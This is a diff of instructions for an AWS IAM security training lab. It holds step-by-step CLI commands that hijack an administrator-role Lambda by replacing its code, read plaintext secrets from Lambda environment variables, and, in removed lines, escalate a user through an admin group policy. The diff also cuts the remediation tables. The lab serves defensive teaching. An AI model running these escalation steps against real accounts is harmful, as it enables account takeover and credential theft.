     identity = sts.get_caller_identity()
 
-    # The Lambda has AdministratorAccess!
-    # Attacker could: create new IAM user, exfiltrate data, etc.
-    return identity
+    # Prove admin access by listing IAM users
+    users = iam.list_users(MaxItems=10)
+    user_names = [u['UserName'] for u in users['Users']]
+
+    return {
+        'statusCode': 200,
+        'identity': {
+            'Account': identity['Account'],
+            'Arn': identity['Arn'],
+            'UserId': identity['UserId']
+        },
+        'proof_of_admin': {
+            'action': 'iam:ListUsers',
+            'result': user_names
+        }
+    }
+PYEOF
+
+cd /tmp/iamws-exploit && zip -j exploit.zip lambda_function.py
+cd -
 ```
 
-Then invoke the function to get the credentials.
+**Step 5: Update the function code**
+```bash
+aws lambda update-function-code \
+  --function-name iamws-privileged-lambda \
+  --zip-file fileb:///tmp/iamws-exploit/exploit.zip \
+  --profile iamws-lambda-developer-user
+```
+
+**Step 6: Invoke the function and prove admin access**
+```bash
+aws lambda invoke \
+  --function-name iamws-privileged-lambda \
+  --payload '{}' \
+  /tmp/iamws-exploit/response.json \
+  --profile iamws-lambda-developer-user
+
+cat /tmp/iamws-exploit/response.json | jq .
+```
+
+**Expected output:**
+```json
+{
+  "statusCode": 200,
+  "identity": {
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/iamws-privileged-lambda-role/iamws-privileged-lambda",
+    "UserId": "AROA..."
+  },
+  "proof_of_admin": {
+    "action": "iam:ListUsers",
+    "result": ["iamws-ci-runner-user", "iamws-group-admin-user", "iamws-lambda-developer-user", "..."]
+  }
+}
+```
+
+**You just hijacked a privileged Lambda function** by replacing its code with a credential-exfiltration payload. The Lambda's identity is `iamws-privileged-lambda-role` with `AdministratorAccess`.
 
 ### Cleanup
 
+Restore the original Lambda code and clean up temp files:
+
 ```bash
-unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+# Recreate the original harmless handler
+cat > /tmp/iamws-exploit/lambda_function.py << 'PYEOF'
+import json
+
+def handler(event, context):
+    return {
+        'statusCode': 200,
+        'body': json.dumps('Hello from privileged Lambda!')
+    }
+PYEOF
+
+cd /tmp/iamws-exploit && zip -j original.zip lambda_function.py
+cd -
+
+# Restore the original code
+aws lambda update-function-code \
+  --function-name iamws-privileged-lambda \
+  --zip-file fileb:///tmp/iamws-exploit/original.zip \
+  --profile iamws-lambda-developer-user
+
+# Clean up temp files
+rm -rf /tmp/iamws-exploit
 ```
 
 ### What You Learned
@@ -736,7 +945,7 @@ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 
 ---
 
-## Exercise 6: GetFunctionConfiguration - Credential Access
+## Exercise 7: GetFunctionConfiguration - Credential Access
 
 **Category:** Credential Access
 **Attacker:** `iamws-secrets-reader-user`
@@ -745,6 +954,10 @@ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 **The Vulnerability:** The `iamws-secrets-reader-user` can read Lambda function configurations, which include environment variables. A Lambda function has secrets (database password, API keys) stored in plaintext environment variables—visible to anyone who can call `GetFunctionConfiguration`.
 
 **Real-world scenario:** A monitoring or debugging tool needs read access to Lambda configurations. Environment variables are a common (but insecure) place to store secrets. Anyone with this read permission can see all secrets.
+
+### Visualize in awspx
+
+Open **Advanced Search** in awspx. Set **From** to `iamws-secrets-reader-user` and **To** to `Effective Admin`, then click **Run** (▶). You may notice that **no attack edge appears** for this user. That's because this vulnerability is *credential access* — reading hardcoded secrets from environment variables — not an IAM privilege escalation. awspx focuses on IAM-based attack paths (policy modification, role assumption, PassRole chains), so credential theft from plaintext env vars falls outside its detection model. This is an important reminder that no single tool catches everything.
 
 ### Part A: Identify with pmapper
 
@@ -769,34 +982,21 @@ This category is different—you're not escalating IAM permissions, you're acces
 
 ### Part C: Exploit the Vulnerability
 
-**Step 1: Assume the secrets reader role**
-```bash
-ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
-
-CREDS=$(aws sts assume-role \
-  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-secrets-reader-role \
-  --role-session-name attacker \
-  --query "Credentials" \
-  --output json)
-
-export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
-export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
-export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
-```
-
-**Step 2: Find Lambdas with environment variables**
+**Step 1: Find Lambdas with environment variables**
 ```bash
 aws lambda list-functions \
   --query 'Functions[?Environment.Variables].FunctionName' \
-  --output table
+  --output table \
+  --profile iamws-secrets-reader-user
 ```
 
-**Step 3: Read the secrets**
+**Step 2: Read the secrets**
 ```bash
 aws lambda get-function-configuration \
   --function-name iamws-app-with-secrets \
   --query 'Environment.Variables' \
-  --output json
+  --output json \
+  --profile iamws-secrets-reader-user
 ```
 
 **Expected output (SECRETS EXPOSED!):**
@@ -812,12 +1012,6 @@ aws lambda get-function-configuration \
 
 **You just read production database credentials, API keys, and admin passwords.**
 
-### Cleanup
-
-```bash
-unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
-```
-
 ### What You Learned
 
 - Lambda environment variables are **visible to anyone** with `GetFunctionConfiguration`
@@ -827,184 +1021,23 @@ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 
 ---
 
-## Exercise 7: PutGroupPolicy - Self-Escalation via Groups
-
-**Category:** Self-Escalation
-**Attacker:** `iamws-group-admin-user`
-
-**The Vulnerability:** The `iamws-group-admin-user` has `iam:PutGroupPolicy` with `Resource: "*"`, allowing them to write arbitrary inline policies on ANY IAM group. Since they're a member of `iamws-dev-team`, they can write an admin policy on that group—immediately granting themselves full access.
-
-**Real-world scenario:** A team lead is given permission to manage group policies for their team. Without a resource constraint limiting WHICH groups they can modify, they can escalate by writing an admin inline policy on their own group.
-
-### Part A: Identify with pmapper
-
-```bash
-pmapper query "can user/iamws-group-admin-user do iam:PutGroupPolicy with *"
-```
-
-Expected output:
-```
-user/iamws-group-admin-user IS authorized to call action
-iam:PutGroupPolicy for resource *
-```
-
-**What this means:** The user can write inline policies on ANY group—including groups they belong to. Since inline policies on a group apply to all members, this is a direct self-escalation path.
-
-### Part B: Understand the Attack Category
-
-Visit [pathfinding.cloud IAM-011](https://pathfinding.cloud/paths/iam-011) to understand this attack path:
-
-- **Category:** Self-Escalation
-- **Required Permission:** `iam:PutGroupPolicy` (unrestricted)
-- **Attack:** Write an inline policy with admin permissions on a group the attacker belongs to
-- **Impact:** Immediate full account access for the attacker (and all other group members)
-
-This is different from Exercise 2's self-escalation (CreatePolicyVersion)—here the attacker escalates through a **group** rather than modifying a managed policy directly. Inline policies on groups are often overlooked in security reviews.
-
-### Part C: Exploit the Vulnerability
-
-**Step 1: Get credentials for the vulnerable principal**
-```bash
-ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
-
-CREDS=$(aws sts assume-role \
-  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-group-admin-role \
-  --role-session-name attacker \
-  --query "Credentials" \
-  --output json)
-
-export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
-export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
-export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
-```
-
-**Step 2: Verify your attacker identity**
-```bash
-aws sts get-caller-identity
-```
-
-You should see you're now operating as `iamws-group-admin-role`.
-
-**Step 3: Enumerate groups and find your membership**
-```bash
-# List all groups
-aws iam list-groups --query 'Groups[].GroupName' --output table
-
-# Check which groups the attacker belongs to
-aws iam list-groups-for-user --user-name iamws-group-admin-user \
-  --query 'Groups[].GroupName' --output table
-```
-
-You'll see the user is a member of `iamws-dev-team`.
-
-**Step 4: View the current benign inline policy**
-```bash
-# List inline policies on the group
-aws iam list-group-policies --group-name iamws-dev-team
-
-# Read the current policy (read-only permissions)
-aws iam get-group-policy \
-  --group-name iamws-dev-team \
-  --policy-name iamws-dev-team-readonly \
-  --query 'PolicyDocument' --output json
-```
-
-Note the limited permissions (S3/EC2 read-only).
-
-**Step 5: Write an admin inline policy on the group**
-```bash
-aws iam put-group-policy \
-  --group-name iamws-dev-team \
-  --policy-name iamws-dev-team-escalated \
-  --policy-document '{
-    "Version": "2012-10-17",
-    "Statement": [{
-      "Effect": "Allow",
-      "Action": "*",
-      "Resource": "*"
-    }]
-  }'
-```
-
-**Step 6: Verify the escalation**
-```bash
-# Now test an admin action - list all IAM users
-aws iam list-users --query 'Users[].UserName' --output table
-```
-
-**You just escalated a group admin to full administrator** by writing an inline policy on a group you belong to. Every member of `iamws-dev-team` is now also an admin.
-
-### Cleanup
-
-```bash
-unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
-
-# Verify you're back to your original identity
-aws sts get-caller-identity
-```
-
-**Instructor will remove the escalated inline policy.**
-
-### What You Learned
-
-- **iam:PutGroupPolicy** with `Resource: "*"` allows writing inline policies on any group
-- Inline policies on a group immediately apply to **all group members**
-- The root cause is the wildcard resource—the user should only be able to manage specific groups
-- This is a second form of self-escalation: through **group membership** rather than direct policy modification
-- **Remediation preview:** In Lab 2, you'll restrict `PutGroupPolicy` with a **resource constraint** limiting which group ARNs can be modified
-
----
-
 ## Wrap-up
 
 ### What You Accomplished
 
 In this lab, you:
 1. Built an IAM graph using pmapper and identified privilege escalation paths
-2. Explored IAM relationships visually with awspx
-3. Exploited **six distinct privilege escalation vulnerabilities**, each with a **different root cause**:
+1. Explored IAM relationships visually with awspx
+1. Exploited **six distinct privilege escalation vulnerabilities**, each with a **different root cause**:
 
 | Exercise | Attack | Category | Root Cause |
 |----------|--------|----------|------------|
-| 2 | CreatePolicyVersion | Self-Escalation | Can modify policy attached to self |
-| 3 | AssumeRole | Principal Access | Trust policy trusts account root |
-| 4 | PassRole + EC2 | New PassRole | Missing iam:PassedToService condition |
-| 5 | UpdateFunctionCode | Existing PassRole | Can modify any Lambda (no resource constraint) |
-| 6 | GetFunctionConfiguration | Credential Access | Secrets in plaintext env vars |
-| 7 | PutGroupPolicy | Self-Escalation | Can write inline policies on own group (no resource constraint) |
-
-### Why Different Root Causes Matter
-
-If all vulnerabilities had the same root cause (like `Resource: "*"`), you'd think:
-> "Just avoid wildcard resources and I'm safe."
-
-But each vulnerability requires a **different defense**:
-
-| Root Cause | Defense |
-|------------|---------|
-| Can modify own attached policy | **Permissions Boundary** |
-| Trust policy too permissive | **Harden Trust Policy** |
-| PassRole missing condition | **Condition Key** (`iam:PassedToService`) |
-| Can modify any resource | **Resource Constraint** |
-| Secrets in plaintext | **Use Secrets Manager** |
-| PutGroupPolicy on any group | **Resource Constraint** (restrict to specific group ARNs) |
-
-### Mapping to Lab 2 Remediations
-
-| Vulnerability | Lab 2 Guardrail | Defense Type |
-|---------------|-----------------|--------------|
-| CreatePolicyVersion | Permissions Boundary | Permissions Boundary |
-| AssumeRole (permissive trust) | Harden Trust Policy | Resource Policy |
-| PassRole + EC2 | Add Condition Key | Condition Key |
-| UpdateFunctionCode | Resource Constraint | Identity Policy Fix |
-| GetFunctionConfiguration | Use Secrets Manager | Best Practice |
-| PutGroupPolicy | Restrict Resource ARN | Resource Constraint |
-
----
-
-## Next Steps
-
-Continue to **[Lab 2 - Fencin' the Frontier](../lab-2-fencin-the-frontier/lab-2-instructions.md)** where you'll apply guardrails to prevent the attacks you just executed.
+| 2 | PutGroupPolicy | Self-Escalation | Can write inline policies on own group (no resource constraint) |
+| 3 | CreatePolicyVersion | Self-Escalation | Can modify policy attached to self |
+| 4 | AssumeRole | Principal Access | Trust policy trusts account root |
+| 5 | PassRole + EC2 | New PassRole | Missing iam:PassedToService condition |
+| 6 | UpdateFunctionCode | Existing PassRole | Can modify any Lambda (no resource constraint) |
+| 7 | GetFunctionConfiguration | Credential Access | Secrets in plaintext env vars 
 
 ---
 
